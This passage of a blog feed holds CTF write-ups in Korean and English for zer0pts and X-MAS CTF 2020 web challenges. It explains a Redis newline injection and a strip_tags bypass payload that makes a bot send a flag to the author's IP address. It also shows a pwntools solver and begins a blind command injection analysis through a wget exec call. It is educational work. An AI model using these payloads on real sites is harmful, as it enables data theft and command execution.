class="keyword">end</span></span><br><span class="line"></span><br><span class="line">before <span class="keyword">do</span></span><br><span class="line">  sock = connect()</span><br><span class="line">  set(sock, <span class="string">&quot;flag&quot;</span>, File.read(<span class="string">&quot;flag.txt&quot;</span>).strip)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> params.has_key?(<span class="symbol">:q</span>) <span class="keyword">then</span></span><br><span class="line">    q = params[<span class="symbol">:q</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (q =~ <span class="regexp">/^[0-9a-f]&#123;16&#125;$/</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    sock = connect()</span><br><span class="line">    url = get(sock, q)</span><br><span class="line">    redirect url</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  send_file <span class="string">&#x27;index.html&#x27;</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> params.has_key?(<span class="symbol">:url</span>) <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  url = params[<span class="symbol">:url</span>]</span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> (url =~ URI.regexp) <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  key = Random.urandom(<span class="number">8</span>).unpack(<span class="string">&quot;H*&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">  sock = connect()</span><br><span class="line">  set(sock, key, url)</span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;<span class="subst">#&#123;request.host&#125;</span>:<span class="subst">#&#123;request.port&#125;</span>/?q=<span class="subst">#&#123;key&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p><strong>취약점은 set 함수를 호출해서 url 값을 value로 이용해서 하나의 데이터를 생성하고 있습니다. 하지만 url 파라미터의 개행문제에 대한 필터링이 존재하지 않아 redis eval 명령어를 이용해서 set, get 명령어를 사용할 수 있게됩니다. </strong><br><br></p><p><strong>그래서 value 값을 redis.call(‘get’,’flag’)를 이용해서 flag를 가져와서 value로 넣어주고, 해당 데이터의 키를 이용해서 접근하면 flag를 볼 수 있습니다. 하지만 익스 페이로드를 작성해서 넘겨주니 잘 되지 않았습니다…</strong><br><br></p><p><strong>다시 풀어 더 정확한 풀이를 남기겠습니다.</strong></p><hr><h3 id="Web-MusicBlog-653pts"><a href="#Web-MusicBlog-653pts" class="headerlink" title="(Web) MusicBlog [653pts]"></a>(Web) MusicBlog [653pts]</h3><p><strong>MusicBlog 문제는 딱히 취약점 분류를 하기는 힘들고, 그냥 웹 서비스 로직 결함을 이용해 공격하는 문제입니다. 일단 소스 코드가 많아 로직이 어떤 식으로 돌아가는 지부터 확인을 해보겠습니다.</strong></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-27%20%EC%98%A4%ED%9B%84%205.54.19.png?raw=true"><br><br><strong>회원 가입을 하고, 로그인을 하면 Post를 작성하는 기능과 Post를 보는 기능이 존재합니다.</strong></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-27%20%EC%98%A4%ED%9B%84%205.57.47.png?raw=true"><br><strong>Post를 작성해주니 이상한 점은 <code>좋아요</code>를 눌러주지 않았는데 <code>좋아요</code>가 하나 찍힌 것을 볼 수 있다. 아마 Post가 새로 생성이 되면 좋아요가 자동으로 찍히는 로직이 있는 거 같습니다. 더 자세한 내용을 확인하기 위해서 코드를 분석해보겠습니다.</strong></p><p><b><em><span style="color:#631F9C">&#62;</span> post.php</em></b></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(생략)</span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;mt-4&quot;</span>&gt;</span></span><br><span class="line">            &lt;?php if ($post[&#x27;published&#x27;] === &#x27;0&#x27;) &#123; ?&gt;<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;badge badge-secondary&quot;</span>&gt;</span>Secret<span class="tag">&lt;/<span class="name">span</span>&gt;</span>&lt;?php &#125; ?&gt;</span><br><span class="line">            &lt;?= $post[&#x27;title&#x27;] ?&gt;</span><br><span class="line">          <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;text-muted&quot;</span>&gt;</span>by &lt;?= $post[&#x27;username&#x27;] ?&gt; <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;badge badge-love badge-pill&quot;</span>&gt;</span>♥ &lt;?= $post[&#x27;likes&#x27;] ?&gt;<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mt-3&quot;</span>&gt;</span></span><br><span class="line">            &lt;?= render_tags($post[&#x27;content&#x27;]) ?&gt;</span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mt-3&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;like.php?id=&lt;?= $post[&#x27;id&#x27;] ?&gt;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;like&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-love&quot;</span>&gt;</span>♥ Like this post<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">(생략)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>post.php를 보면 content의 값을 render_tags() 함수를 이용해서 검증을 하고 출력하는 것을 볼 수 있습니다.</p><p><b><em><span style="color:#631F9C">&#62;</span> util.php</em></b></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="comment">// [[URL]] → &lt;audio src=&quot;URL&quot;&gt;&lt;/audio&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render_tags</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$str</span> = preg_replace(<span class="string">&#x27;/\[\[(.+?)\]\]/&#x27;</span>, <span class="string">&#x27;&lt;audio controls src=&quot;\\1&quot;&gt;&lt;/audio&gt;&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  <span class="variable">$str</span> = strip_tags(<span class="variable">$str</span>, <span class="string">&#x27;&lt;audio&gt;&#x27;</span>); <span class="comment">// only allows `&lt;audio&gt;`</span></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>util.php를 보면 render_tags() 함수가 존재합니다. preg_replace() 함수를 이용해서 &#91;&#91;ULR&#93;&#93;이라는 값이 들어오면 &lt;audio&gt;로 변환시켜주고, strip_tags() 함수를 이용해서 audio 태그만 허용하고 있는 것을 볼 수 있습니다. 하지만 strip_tags() 함수에서 취약점이 존재합니다.</strong></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-27%20%EC%98%A4%ED%9B%84%206.25.19.png?raw=true"></p><p><strong>위 사진을 보면 <code>&lt;a/udio&gt;</code>라는 문자열이 들어와도 <code>&lt;audio&gt;</code>로 인식을 하는 것을 볼 수 있습니다. 중간에 슬래쉬가 들어와도 동일하게 인식을 합니다. 이를 이용해서 오디오 태그 외에 a 태그도 사용을 할 수 있다는 것을 알 수 있습니다.</strong></p><p><b><em><span style="color:#631F9C">&#62;</span> worker.js</em></b></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> crawl = <span class="keyword">async</span> (url) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[+] Query! (<span class="subst">$&#123;url&#125;</span>)`</span>);</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> page.setUserAgent(flag);</span><br><span class="line">        <span class="keyword">await</span> page.goto(url, &#123;</span><br><span class="line">            waitUntil: <span class="string">&#x27;networkidle0&#x27;</span>,</span><br><span class="line">            timeout: <span class="number">3</span> * <span class="number">1000</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        page.click(<span class="string">&#x27;#like&#x27;</span>);</span><br><span class="line">        <span class="keyword">await</span> page.waitForNavigation(&#123;<span class="attr">timeout</span>: <span class="number">3000</span>&#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> page.close();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[+] Done! (<span class="subst">$&#123;url&#125;</span>)`</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>아까 Post를 생성하면 <code>좋아요</code>가 하나 찍히는 것을 확인했습니다. 그래서 해당 로직을 찾아보니 wocker.js에 crawl로 정의를 하는 것을 볼 수 있었습니다.  위 코드는 Post가 생성이 되면 <code>User-Agent</code>의 값으로 <code>FLAG</code>를 넣고, id 값이 like인 버튼을 클릭해서 <code>좋아요</code>를 눌러주는 것을 볼 수 있습니다.</strong></p><p><b><em><span style="color:#631F9C">&#62;</span> init.php</em></b></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">header(<span class="string">&quot;Content-Security-Policy: default-src &#x27;self&#x27;; object-src &#x27;none&#x27;; script-src &#x27;nonce-$&#123;nonce&#125;&#x27; &#x27;strict-dynamic&#x27;; base-uri &#x27;none&#x27;; trusted-types&quot;</span>);</span><br><span class="line">header(<span class="string">&#x27;X-Frame-Options: DENY&#x27;</span>);</span><br><span class="line">header(<span class="string">&#x27;X-XSS-Protection: 1; mode=block&#x27;</span>);</span><br></pre></td></tr></table></figure><p><strong>그래서 XSS를 이용해서 User-Agent 값을 가져와야 하나 생각을 했지만 위와 같이 CSP가 걸려 있어 불가능해보였습니다,, 하지만 아까 util.php의 render_tags() 함수에서 strip_tags() 함수를 사용해서 태그를 검증하고 있었는데 이때 함수를 우회해서 a 태그를 사용할 수 있었습니다.</strong><br><br></p><p><strong>그럼 content의 값으로 “&#60;a id=’like’ href=’myip’&#62;&#60;/a&#62;”를 주면 click(‘#like’)에 의해서 User-Agent에 FLAG가 들어있는 상태로 myip로 요청이 갈 것 입니다.</strong></p><p><b><em><span style="color:#631F9C">&#62;</span> Exploit</em></b></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-27%20%EC%98%A4%ED%9B%84%206.54.47.png?raw=true"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a/udio id=&quot;like&quot; href=&quot;http://141.164.52.207:12345&quot;&gt;GG<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>그래서 위 페이로드를 <code>Content</code>의 값으로 넘겨주니 요청이 내 서버로 전송이 된 것을 확인할 수 있었고, User-Agent 헤더의 flag가 있는 것도 볼 수 있었습니다.</strong></p><p><code>FLAG : zer0pts&#123;M4sh1m4fr3sh!!&#125;</code></p><hr><h3 id="Web-phpNantoKaAdmin-755pts"><a href="#Web-phpNantoKaAdmin-755pts" class="headerlink" title="(Web) phpNantoKaAdmin [755pts]"></a>(Web) phpNantoKaAdmin [755pts]</h3><p><strong>귀찮다.</strong></p><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
            <tag> Python Pickle RCE </tag>
            
            <tag> REDIS </tag>
            
            <tag> Client Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>X-MAS CTF 2020 Write Up</title>
      <link href="2020/12/19/2020-12-19-X-MAS-CTF-2020/"/>
      <url>2020/12/19/2020-12-19-X-MAS-CTF-2020/</url>
      
        <content type="html"><![CDATA[<p>This is the first X-MAS CTF to start studying web security and it was much more fun than I thought. Let’s write a Write Up of interesting problems while solving problems in this CTF.<br><br></p><p>This time, I participated in CTF by collaborating with <span style="color:blue"><code>Einstrasse</code></span>. If you want to see eine’s Write Up, you can go <a href="https://eine.tistory.com/entry/Xmas-CTF-2020-write-ups-focus-on-web-challs?category=826774">here</a>!</p><p><img src="https://github.com/wjddnjs33/image2/blob/main/main.png?raw=true"></p><hr><h3 id="Programming-Least-Greatest"><a href="#Programming-Least-Greatest" class="headerlink" title="(Programming) Least Greatest"></a>(Programming) Least Greatest</h3><p><strong>Challenge Author :</strong> Gabies, Nutu<br><br><strong>Category :</strong> Programming<br><br><strong>Points :</strong> 50<br><br><strong>Solves :</strong> 162<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%EC%A0%84%206.13.28.png?raw=true"><br>This time, we will solve the programming problems from X-MAS CTF 2020. The problem was solved easily because <code>eine</code> analyzed the algorithm.<br><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%EC%A0%84%206.15.26.png?raw=true"><br>If you connect with nc, you can see that gcd, lcm numbers are given. Here, the number of factors obtained by decomposing the lcm/gcd value by 2^N is given to the next step.<br><br></p><p>It is said that you can do this a total of 100 times, but the time should be within 90 seconds. So I just used Python to write the code and return it.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> check_output</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;challs.xmas.htsp.ro&quot;</span>, <span class="number">6050</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;1/100\n&quot;</span>).strip().split()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">go</span>(<span class="params">_count</span>):</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(_count):</span><br><span class="line">        num = r.recvline().decode(<span class="string">&#x27;utf-8&#x27;</span>).split(<span class="string">&quot;= &quot;</span>)[<span class="number">1</span>]</span><br><span class="line">        num1 = r.recvline().decode(<span class="string">&#x27;utf-8&#x27;</span>).split(<span class="string">&quot;= &quot;</span>)[<span class="number">1</span>]</span><br><span class="line">        print(<span class="string">&quot;gcd(x, y) : &quot;</span> + num)</span><br><span class="line">        print(<span class="string">&quot;lcm(x, y) : &quot;</span> + num1)</span><br><span class="line">        s_num = <span class="built_in">int</span>(<span class="built_in">int</span>(num1)//<span class="built_in">int</span>(num))</span><br><span class="line">        cmd = <span class="string">&quot;yafu-x64 factor(&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(s_num)</span><br><span class="line">        out = subprocess.check_output(cmd, shell=<span class="literal">True</span>)</span><br><span class="line">        check = out.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        length = check.count(<span class="string">&#x27;P&#x27;</span>)</span><br><span class="line">        data = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">            data.append(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length+<span class="number">1</span>):</span><br><span class="line">            data[j] = check.split(<span class="string">&#x27;P&#x27;</span>)[i].split(<span class="string">&quot; =&quot;</span>)[<span class="number">1</span>].replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;ans&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        b = []</span><br><span class="line">        k = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                b.append(data[i])</span><br><span class="line">            <span class="keyword">if</span> i != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>+k,<span class="built_in">len</span>(b)):</span><br><span class="line">                    <span class="keyword">if</span> b[j] != data[i]:</span><br><span class="line">                        b.append(data[i])</span><br><span class="line">                        k += <span class="number">1</span>           </span><br><span class="line">        Count = <span class="built_in">len</span>(b)</span><br><span class="line">        count = <span class="number">2</span>**Count</span><br><span class="line">        print(<span class="string">&quot;Round : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(a+<span class="number">1</span>))</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(count))</span><br><span class="line">        print(r.recvline())</span><br><span class="line">        r.recvline()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    go(<span class="number">100</span>)</span><br><span class="line">    print(r.recv())</span><br></pre></td></tr></table></figure><p>I wrote the exploit code as above.<br><img src="https://github.com/wjddnjs33/image/blob/main/KakaoTalk_Photo_2020-12-18-06-22-00.png?raw=true"><br>When I returned the exploit code, I could see the flag appear.</p><p><code>FLAG : X-MAS&#123;gr347es7_c0mm0n_d1v1s0r_4nd_l345t_c0mmon_mult1pl3_4r3_1n73rc0nn3ct3d&#125;</code></p><hr><h3 id="Web-PHP-Master-easy"><a href="#Web-PHP-Master-easy" class="headerlink" title="(Web) PHP Master easy"></a>(Web) PHP Master <code>easy</code></h3><p><strong>Challenge Author :</strong> yakuhito<br><br><strong>Category :</strong> WEB<br><br><strong>Points :</strong> 33<br><br><strong>Solves :</strong> 325<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%EC%A0%84%206.25.00.png?raw=true"></p><p>Solve URL : <code>http://challs.xmas.htsp.ro:3000/?param1=1.0&amp;param2=001</code><br><br><code>FLAG : X-MAS&#123;s0_php_m4ny_skillz-69acb43810ed4c42&#125;</code></p><hr><h3 id="Web-Santa’s-consolation-easy"><a href="#Web-Santa’s-consolation-easy" class="headerlink" title="(Web) Santa’s consolation easy"></a>(Web) Santa’s consolation <code>easy</code></h3><p><strong>Challenge Author :</strong> littlewho<br><br><strong>Category :</strong> WEB<br><br><strong>Points :</strong> 50<br><br><strong>Solves :</strong> 285<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%EC%A0%84%206.25.11.png?raw=true"></p><hr><h3 id="Web-flag-checker"><a href="#Web-flag-checker" class="headerlink" title="(Web) flag_checker"></a>(Web) flag_checker</h3><p><strong>Challenge Author :</strong> yakuhito<br><br><strong>Category :</strong> WEB<br><br><strong>Points :</strong> 59<br><br><strong>Solves :</strong> 99<br><br><strong>TL;DR</strong> : Blind Command Injection<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%EC%A0%84%206.25.20.png?raw=true"><br>This time, we will solve a problem called <code>flag_checker</code> among web problems in X-MAS CTF 2020.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* flag_checker */</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFlag</span>(<span class="params"><span class="variable">$flag</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$example_flag</span> = strtolower(<span class="string">&#x27;FAKE-X-MAS&#123;d1s_i\$_a_SaMpL3_Fl4g_n0t_Th3_c0Rr3c7_one_karen_l1k3s_HuMu5.0123456789&#125;&#x27;</span>);</span><br><span class="line">    <span class="variable">$valid</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$flag</span>) &amp;&amp; <span class="variable">$valid</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$example_flag</span>, strtolower(<span class="variable">$flag</span>[<span class="variable">$i</span>])) === <span class="literal">false</span>) <span class="variable">$valid</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$valid</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"><span class="variable">$flag</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$command</span> = <span class="string">&quot;wget -q -O - https://kuhi.to/flag/&quot;</span> . <span class="variable">$flag</span>;</span><br><span class="line">    <span class="variable">$cmd_output</span> = <span class="keyword">array</span>();</span><br><span class="line">    exec(<span class="variable">$command</span>, <span class="variable">$cmd_output</span>);</span><br><span class="line">    <span class="keyword">if</span>(count(<span class="variable">$cmd_output</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Nope&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Maybe&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!checkFlag(<span class="variable">$flag</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;That is not a correct flag!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getFlag(<span class="variable">$flag</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>When it comes to problems, the above PHP source code exists.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFlag</span>(<span class="params"><span class="variable">$flag</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$example_flag</span> = strtolower(<span class="string">&#x27;FAKE-X-MAS&#123;d1s_i\$_a_SaMpL3_Fl4g_n0t_Th3_c0Rr3c7_one_karen_l1k3s_HuMu5.0123456789&#125;&#x27;</span>);</span><br><span class="line">    <span class="variable">$valid</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$flag</span>) &amp;&amp; <span class="variable">$valid</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$example_flag</span>, strtolower(<span class="variable">$flag</span>[<span class="variable">$i</span>])) === <span class="literal">false</span>) <span class="variable">$valid</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$valid</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Looking at the checkFlag function, it puts a fake flag in a variable called example_flag, and checks whether the character in $flag is in example_flag.<br><br></p><p>If any of the values of $flag are not included in example_flag, False is returned.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"><span class="variable">$flag</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$command</span> = <span class="string">&quot;wget -q -O - https://kuhi.to/flag/&quot;</span> . <span class="variable">$flag</span>;</span><br><span class="line">    <span class="variable">$cmd_output</span> = <span class="keyword">array</span>();</span><br><span class="line">    exec(<span class="variable">$command</span>, <span class="variable">$cmd_output</span>);</span><br><span class="line">    <span class="keyword">if</span>(count(<span 